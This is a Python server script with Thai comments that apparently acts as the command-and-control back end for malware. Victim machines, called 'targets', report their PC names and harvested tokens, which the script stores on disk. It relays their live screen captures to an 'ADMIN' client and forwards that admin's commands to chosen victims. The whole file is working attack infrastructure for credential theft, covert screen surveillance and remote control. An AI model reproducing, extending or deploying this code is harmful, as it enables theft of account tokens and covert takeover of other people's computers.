import socket
import threading
import json
import os
from datetime import datetime

# --- การตั้งค่า ---
HOST = '0.0.0.0'
PORT = 5050
DB_FILE = "persistent_db.json"

# ฐานข้อมูลในหน่วยความจำ
storage = {
    "targets": {},  # { "pc_name": { "tokens": [], "last_seen": "", "conn": socket } }
    "admin": None
}

def save_to_disk():
    """บันทึกข้อมูล Token และ PC ที่เคยเชื่อมต่อลงไฟล์ JSON"""
    data_to_save = {}
    for name, info in storage["targets"].items():
        data_to_save[name] = {
            "tokens": info["tokens"],
            "last_seen": info.get("last_seen", "N/A")
        }
    with open(DB_FILE, "w", encoding="utf-8") as f:
        json.dump(data_to_save, f, indent=4, ensure_ascii=False)

def load_from_disk():
    """โหลดข้อมูลจากไฟล์เมื่อเปิด Server"""
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r", encoding="utf-8") as f:
                loaded = json.load(f)
                for name, info in loaded.items():
                    storage["targets"][name] = {
                        "tokens": info["tokens"],
                        "last_seen": info["last_seen"],
                        "conn": None,
                        "status": "Offline"
                    }
        except Exception as e:
            print(f"[!] Load Error: {e}")

def handle_client(conn, addr):
    target_pc_name = None
    try:
        # รับข้อมูลระบุตัวตน (Identity)
        identity_data = conn.recv(4096).decode('utf-8')
        
        # --- 1. กรณีเป็นเครื่อง ADMIN ---
        if identity_data == "ADMIN":
            storage["admin"] = conn
            print(f"[*] Admin Connected: {addr}")
            
            # ส่งข้อมูลเครื่องทั้งหมดใน DB ให้ Admin (Header 4 bytes + JSON)
            db_snapshot = {}
            for name, info in storage["targets"].items():
                db_snapshot[name] = info["tokens"]
                
            db_json = json.dumps(db_snapshot).encode('utf-8')
            conn.sendall(len(db_json).to_bytes(4, 'big') + db_json)
            
            # วนลูปรับคำสั่งจาก Admin เพื่อ Relay ไปยัง Target
            while True:
                admin_msg = conn.recv(4096).decode('utf-8')
                if not admin_msg: break
                
                # Format: "PC_NAME|COMMAND"
                if "|" in admin_msg:
                    target_name, cmd = admin_msg.split("|", 1)
                    if target_name in storage["targets"] and storage["targets"][target_name]["conn"]:
                        try:
                            storage["targets"][target_name]["conn"].sendall(f"CMD:{cmd}".encode('utf-8'))
                        except: pass
            return

        # --- 2. กรณีเป็นเครื่อง TARGET (Sender) ---
        else:
            target_info = json.loads(identity_data)
            target_pc_name = target_info["pc_name"]
            
            # อัปเดตข้อมูลในระบบ
            storage["targets"][target_pc_name] = {
                "tokens": target_info["tokens"],
                "conn": conn,
                "last_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "status": "Online"
            }
            save_to_disk()
            print(f"[+] Target Online: {target_pc_name} ({addr[0]})")

            # วนลูปรับภาพหน้าจอและ Relay ไปยัง Admin
            while True:
                # รับ Header: Width(4), Height(4), Size(4)
                header = conn.recv(12)
                if not header or len(header) < 12: break
                
                img_size = int.from_bytes(header[8:12], 'big')
                
                # อ่านข้อมูลภาพตาม Size
                img_data = b""
                while len(img_data) < img_size:
                    chunk = conn.recv(min(img_size - len(img_data), 65536))
                    if not chunk: break
                    img_data += chunk
                
                # ถ้า Admin เชื่อมต่ออยู่ ให้ส่งต่อข้อมูล (Relay)
                if storage["admin"]:
                    try:
                        # ส่ง PC Tag (32 bytes) + Header + Image Data
                        pc_tag = target_pc_name.encode('utf-8').ljust(32)
                        storage["admin"].sendall(pc_tag + header + img_data)
                    except:
                        storage["admin"] = None # Admin หลุด

    except Exception as e:
        print(f"[!] Connection Error ({target_pc_name}): {e}")
    finally:
        if target_pc_name and target_pc_name in storage["targets"]:
            storage["targets"][target_pc_name]["conn"] = None
            storage["targets"][target_pc_name]["status"] = "Offline"
        conn.close()

if __name__ == "__main__":
    load_from_disk()
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(100)
    print(f"--- Proxy Server Started on Port {PORT} ---")
    while True:
        client_conn, client_addr = server.accept()
        threading.Thread(target=handle_client, args=(client_conn, client_addr), daemon=True).start()